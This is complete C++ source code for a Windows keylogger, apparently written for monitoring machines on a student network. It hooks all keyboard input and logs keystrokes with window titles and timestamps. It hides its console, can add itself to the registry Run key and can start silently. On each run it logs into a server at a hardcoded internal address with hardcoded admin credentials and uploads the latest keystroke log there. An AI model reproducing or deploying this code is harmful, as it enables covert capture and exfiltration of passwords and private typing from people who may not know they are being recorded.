#define UNICODE
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

#include <windows.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <regex>
#include <algorithm>
#include <curl/curl.h>
#include "../../../library/json.h"
#include <cstring>
#include <cstdio>
#include <sstream>
#include <time.h>
#include <map>
#include <shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")


using json = nlohmann::json;
namespace fs = std::filesystem;


// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define invisible // (visible / invisible)

// Defines whether you want to enable or disable 
// boot time waiting if running at system boot.
#define bootwait // (bootwait / nowait)

// defines which format to use for logging
// 0 for default, 10 for dec codes, 16 for hex codex
#define FORMAT 0

// defines if ignore mouseclicks
#define mouseignore

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.

bool isRecording = true;
HHOOK _hook;

#if FORMAT == 0
const std::map<int, std::string> keyname{
    {VK_BACK, "[BACKSPACE]" },
    {VK_RETURN,	"\n" },
    {VK_SPACE,	"_" },
    {VK_TAB,	"[TAB]" },
    {VK_SHIFT,	"[SHIFT]" },
    {VK_LSHIFT,	"[LSHIFT]" },
    {VK_RSHIFT,	"[RSHIFT]" },
    {VK_CONTROL,	"[CONTROL]" },
    {VK_LCONTROL,	"[LCONTROL]" },
    {VK_RCONTROL,	"[RCONTROL]" },
    {VK_MENU,	"[ALT]" },
    {VK_LWIN,	"[LWIN]" },
    {VK_RWIN,	"[RWIN]" },
    {VK_ESCAPE,	"[ESCAPE]" },
    {VK_END,	"[END]" },
    {VK_HOME,	"[HOME]" },
    {VK_LEFT,	"[LEFT]" },
    {VK_RIGHT,	"[RIGHT]" },
    {VK_UP,		"[UP]" },
    {VK_DOWN,	"[DOWN]" },
    {VK_PRIOR,	"[PG_UP]" },
    {VK_NEXT,	"[PG_DOWN]" },
    {VK_OEM_PERIOD,	"." },
    {VK_DECIMAL,	"." },
    {VK_OEM_PLUS,	"+" },
    {VK_OEM_MINUS,	"-" },
    {VK_ADD,		"+" },
    {VK_SUBTRACT,	"-" },
    {VK_CAPITAL,	"[CAPSLOCK]" },
};
#endif

KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file;

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}



int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = "";
#ifndef mouseignore 
    if ((key_stroke == 1) || (key_stroke == 2))
    {
        return 0; // ignore mouse clicks
    }
#endif
    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground)
    {
        // get keyboard layout of the thread
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            // get time
            struct tm tm_info;
            time_t t = time(NULL);
            localtime_s(&tm_info, &t);
            char s[64];
            strftime(s, sizeof(s), "%FT%X%z", &tm_info);

            output << "\n\n[Window: " << window_title << " - at " << s << "] " << "\n";
        }
    }

#if FORMAT == 10
    output << '[' << key_stroke << ']';
#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']';
#else
    if (keyname.find(key_stroke) != keyname.end())
    {
        output << keyname.at(key_stroke);
    }
    else
    {
        char key;
        // check caps lock
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        // check shift key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
        {
            lowercase = !lowercase;
        }

        // map virtual key according to keyboard layout
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        // tolower converts it to lowercase properly
        if (!lowercase)
        {
            key = tolower(key);
        }
        output << char(key);
    }
#endif
    // instead of opening and closing file handlers every time, keep file open and flush.
    output_file << output.str();
    output_file.flush();

    std::cout << output.str();

    return 0;
}

void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
    FreeConsole();
#endif
}

// Function to check if the system is still booting up
bool IsSystemBooting()
{
    return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

// 自启注册表项名称
const wchar_t* REG_RUN_PATH = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const wchar_t* APP_NAME = L"MyKeylogger";

// 获取当前程序完整路径
std::wstring GetModulePath()
{
    wchar_t path[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return std::wstring(path);
}

// 判断是否已设置自启
bool IsAutoStartEnabled()
{
    HKEY hKey;
    bool enabled = false;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        wchar_t value[MAX_PATH];
        DWORD size = sizeof(value);
        if (RegQueryValueExW(hKey, APP_NAME, NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS)
        {
            enabled = (GetModulePath() == value);
        }
        RegCloseKey(hKey);
    }
    return enabled;
}

// 设置或取消自启
bool SetAutoStart(bool enable)
{
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return false;

    bool result = false;
    if (enable)
    {
        std::wstring path = GetModulePath();
        result = (RegSetValueExW(hKey, APP_NAME, 0, REG_SZ, (BYTE*)path.c_str(), (DWORD)((path.size() + 1) * sizeof(wchar_t))) == ERROR_SUCCESS);
    }
    else
    {
        result = (RegDeleteValueW(hKey, APP_NAME) == ERROR_SUCCESS);
    }
    RegCloseKey(hKey);
    return result;
}

// 静默启动注册表项
const wchar_t* SILENT_MODE_VALUE = L"SilentMode";

// 获取静默启动状态
bool IsSilentMode()
{
    HKEY hKey;
    DWORD value = 0, size = sizeof(value);
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        if (RegQueryValueExW(hKey, SILENT_MODE_VALUE, NULL, NULL, (LPBYTE)&value, &size) == ERROR_SUCCESS)
        {
            RegCloseKey(hKey);
            return value == 1;
        }
        RegCloseKey(hKey);
    }
    return false;
}

// 设置静默启动状态
bool SetSilentMode(bool enable)
{
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return false;
    DWORD value = enable ? 1 : 0;
    bool result = (RegSetValueExW(hKey, SILENT_MODE_VALUE, 0, REG_DWORD, (BYTE*)&value, sizeof(value)) == ERROR_SUCCESS);
    RegCloseKey(hKey);
    return result;
}

// 获取本机 IPv4 地址（第一个非回环 IPv4 地址），失败返回 "unknown"
std::string GetLocalIPAddress()
{
    std::string ip = "unknown";
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return ip;

    char hostname[256] = {0};
    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
    {
        WSACleanup();
        return ip;
    }

    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET; // IPv4
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    struct addrinfo* result = nullptr;
    if (getaddrinfo(hostname, NULL, &hints, &result) != 0)
    {
        WSACleanup();
        return ip;
    }

    std::string fallback_ip = "unknown";

    for (struct addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next)
    {
        if (ptr->ai_family == AF_INET)
        {
            char ipstr[INET_ADDRSTRLEN] = {0};
            sockaddr_in* sa = (sockaddr_in*)ptr->ai_addr;
            InetNtopA(AF_INET, &sa->sin_addr, ipstr, INET_ADDRSTRLEN);
            std::string candidate(ipstr);

            // 优先选择以 "10.88." 开头的 IP
            if (candidate.rfind("10.88.", 0) == 0)
            {
                ip = candidate;
                break;
            }

            // 如果没有找到以 "10.88." 开头的 IP，记录第一个非回环地址作为备用
            if (candidate != "127.0.0.1" && !candidate.empty() && fallback_ip == "unknown")
            {
                fallback_ip = candidate;
            }
        }
    }

    freeaddrinfo(result);
    WSACleanup();

    // 如果没有找到以 "10.88." 开头的 IP，使用第一个非回环地址
    if (ip == "unknown")
    {
        ip = fallback_ip;
    }

    return ip;
}

std::string GetDateString()
{
    char buf[32] = {0};
    time_t t = time(NULL);
    struct tm tm_info;
    localtime_s(&tm_info, &t);
    // 格式：YYYYMMDD
    strftime(buf, sizeof(buf), "%Y%m%d", &tm_info);
    return std::string(buf);
}

std::string MakeOutputFilename()
{
    std::string ip = GetLocalIPAddress();
    // 将 IP 中可能的非法字符（极少）替换为 '-'
    for (char &c : ip)
    {
        if (c == '/' || c == '\\' || c == ':' || c == '*' || c == '?' || c == '\"' || c == '<' || c == '>' || c == '|')
            c = '-';
    }
    std::string date = GetDateString();
    return ip + "_" + date + ".log";
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        // the action is valid: HC_ACTION.
        if (wParam == WM_KEYDOWN)
        {
            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            // Check for Ctrl + Shift + Alt + P
            if (kbdStruct.vkCode == 'P' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                isRecording = !isRecording;
                if (isRecording)
                {
                    std::cout << "录制继续\n";
                    MessageBox(NULL, L"继续录(/≧▽≦)/", L"录制继续", MB_OK);
                }
                else
                {
                    std::cout << "录制暂停\n";
                    MessageBox(NULL, L"不录啦╰(￣ω￣ｏ)", L"录制暂停", MB_OK);
                }
            }
            // Check for Ctrl + Shift + Alt + Q
            else if (kbdStruct.vkCode == 'Q' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                MessageBox(NULL, L"真不录啦（*゜ー゜*）\n\n那拜拜啦(o゜▽゜)o☆", L"录制结束", MB_OK);
                std::cout << "录制结束\n";
                ReleaseHook();
                output_file.close();
                exit(0);
            }
            // Check for Ctrl + Shift + Alt + S (开机自启)
            else if (kbdStruct.vkCode == 'S' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                bool enabled = IsAutoStartEnabled();
                if (SetAutoStart(!enabled))
                {
                    if (!enabled)
                        MessageBox(NULL, L"已设置为开机自啟 awa", L"自启设置", MB_OK);
                    else
                        MessageBox(NULL, L"已取消开机自启 qaq", L"自启设置", MB_OK);
                }
                else
                {
                    MessageBox(NULL, L"自启设置失败，请以管理员身份运行w", L"自启设置", MB_OK | MB_ICONERROR);
                }
            }
            // Check for Ctrl + Shift + Alt + D (静默启动)
            else if (kbdStruct.vkCode == 'D' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                bool silent = IsSilentMode();
                if (SetSilentMode(!silent))
                {
                    if (!silent)
                        MessageBox(NULL, L"已设置为静默启动（下次启动不再弹窗）", L"静默启动", MB_OK);
                    else
                        MessageBox(NULL, L"已取消静默启动（下次启动会弹窗）", L"静默启动", MB_OK);
                }
                else
                {
                    MessageBox(NULL, L"设置静默启动失败，请以管理员身份运行", L"静默启动", MB_OK | MB_ICONERROR);
                }
            }
            else
            {
                // save to file only if recording
                if (isRecording)
                {
                    Save(kbdStruct.vkCode);
                }
            }
        }
    }

    // call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

// 获取程序当前执行目录
std::string getExecutableDir() {
    char exePath[MAX_PATH];
    DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (len == 0) {
        std::cerr << "获取程序路径失败，错误码: " << GetLastError() << std::endl;
        return "";
    }
    std::string path(exePath, len);
    size_t lastSlash = path.find_last_of("\\/");
    return (lastSlash != std::string::npos) ? path.substr(0, lastSlash + 1) : "";
}

// 读取文件内容到内存（用于上传）
std::string readFileContent(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "无法打开文件: " << filePath << std::endl;
        return "";
    }
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::string buffer(size, '\0');
    if (!file.read(&buffer[0], size)) {
        std::cerr << "读取文件失败: " << filePath << std::endl;
        return "";
    }
    return buffer;
}

// CURL 回调函数：捕获响应数据
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    try {
        s->append((char*)contents, newLength);
    }
    catch (std::bad_alloc& e) {
        return 0;
    }
    return newLength;
}

// 获取 token
std::string api_get() {
    CURL* curl = curl_easy_init();
    std::string response_string;
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
        curl_easy_setopt(curl, CURLOPT_URL, "http://10.88.202.73:5244/api/auth/login");
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        const char* data = R"({"username": "admin", "password": "adm1n5"})";
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "登录请求失败: " << curl_easy_strerror(res) << std::endl;
        }
        else {
            try {
                json j = json::parse(response_string);
                if (j["code"] == 200 && j["data"].contains("token")) {
                    return j["data"]["token"];
                }
                else {
                    std::cerr << "登录失败: " << response_string << std::endl;
                }
            }
            catch (const std::exception& e) {
                std::cerr << "解析登录响应失败: " << e.what() << std::endl;
            }
        }
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }
    else {
        std::cerr << "curl 初始化失败" << std::endl;
    }
    return "";
}

// 上传文件到服务器
void uploadFile(const std::string& token, const std::string& localFilePath, const std::string& serverFilePath) {
    if (token.empty()) {
        std::cerr << "token 为空，无法上传" << std::endl;
        return;
    }

    std::string fileContent = readFileContent(localFilePath);
    if (fileContent.empty()) {
        return;
    }

    CURL* curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");
        curl_easy_setopt(curl, CURLOPT_URL, "http://10.88.202.73:5244/api/fs/put");
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, ("Authorization: " + token).c_str());
        headers = curl_slist_append(headers, ("File-Path: " + serverFilePath).c_str());
        headers = curl_slist_append(headers, ("Content-Length: " + std::to_string(fileContent.size())).c_str());
        headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, fileContent.data());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, fileContent.size());

        std::string response;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "上传失败: " << curl_easy_strerror(res) << std::endl;
        }
        else {
            std::cout << "上传响应: " << response << std::endl;
        }

        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }
    else {
        std::cerr << "curl 初始化失败" << std::endl;
    }
}

// 筛选符合格式的日志文件并返回最新的一个
std::string findLatestLogFile(const std::string& dir) {
    if (dir.empty() || !fs::exists(dir) || !fs::is_directory(dir)) {
        std::cerr << "目录不存在或无效: " << dir << std::endl;
        return "";
    }

    // 正则表达式：匹配 <IP>_<YYYYMMDD>.log 格式
    // IP 格式：xxx.xxx.xxx.xxx（简单匹配，不严格验证 IP 合法性）
    // 日期格式：YYYYMMDD（8位数字）
    std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
    std::smatch match;

    std::vector<std::pair<std::string, std::string>> validLogs;  // 存储（文件名，日期）

    // 遍历目录下的所有文件
    for (const auto& entry : fs::directory_iterator(dir)) {
        if (entry.is_regular_file()) {  // 只处理文件
            std::string fileName = entry.path().filename().string();
            if (std::regex_match(fileName, match, logPattern)) {
                // 提取日期部分（第2个捕获组）
                std::string dateStr = match[2].str();
                validLogs.emplace_back(fileName, dateStr);
                std::cout << "发现符合格式的日志文件: " << fileName << "（日期: " << dateStr << "）" << std::endl;
            }
        }
    }

    if (validLogs.empty()) {
        std::cerr << "未找到符合格式的日志文件（<IP>_<YYYYMMDD>.log）" << std::endl;
        return "";
    }

    // 按日期降序排序（最新的日期在前面）
    std::sort(validLogs.begin(), validLogs.end(),
        [](const auto& a, const auto& b) {
            return a.second > b.second;  // 日期字符串直接比较（YYYYMMDD 格式可直接排序）
        });

    // 返回最新文件的完整路径
    return dir + validLogs[0].first;
}


int main()
{
    Stealth();
    std::string token = api_get();
    if (token.empty()) {
        return 1;
    }
    std::cout << "获取到 token: " << token << std::endl;

    // 2. 获取程序执行目录
    std::string exeDir = getExecutableDir();
    if (exeDir.empty()) {
        return 1;
    }
    std::cout << "程序执行目录: " << exeDir << std::endl;

    // 3. 查找最新的日志文件
    std::string latestLogPath = findLatestLogFile(exeDir);
    if (latestLogPath.empty()) {
        return 1;
    }
    std::cout << "最新的日志文件: " << latestLogPath << std::endl;

    // 4. 配置服务器目标路径（保持与本地文件名一致，上传到服务器的临时文件夹）
    fs::path logPath(latestLogPath);
    std::string fileName = logPath.filename().string();  // 提取文件名（如 192.168.1.2_20251019.log）
    std::string serverFile = "/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/log/" + fileName;  // 服务器路径（根据实际调整）

    // 5. 上传文件
    uploadFile(token, latestLogPath, serverFile);

    if (!IsSilentMode()) {
        MessageBox(NULL, L"开录 q(≧▽≦q)\n\n快捷键小提示ww\nCtrl + Shift + Alt + P  暂停录制\nCtrl + Shift + Alt + Q  结束录制\nCtrl + Shift + Alt + S  设置/取消开机自启\nCtrl + Shift + Alt + D  设置/取消静默启动\n\n录制日志将保存在当前目录ヾ(≧▽≦*)o，文件名格式为 ip_日期.log  例：192.168.1.2_20251019.log", L"录制开始", MB_OK);
    }
#ifdef bootwait 
    while (IsSystemBooting())
    {
        std::cout << "系统正在启动中。10秒后再次检查...\n";
        Sleep(10000);
    }
#endif
#ifdef nowait 
    std::cout << "跳过系统启动检查。\n";
#endif

    std::string output_filename = MakeOutputFilename();
    std::cout << "输出日志到 " << output_filename << std::endl;

    output_file.open(output_filename, std::ios_base::app);

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }

    ReleaseHook();
    output_file.close();
    return 0;
}
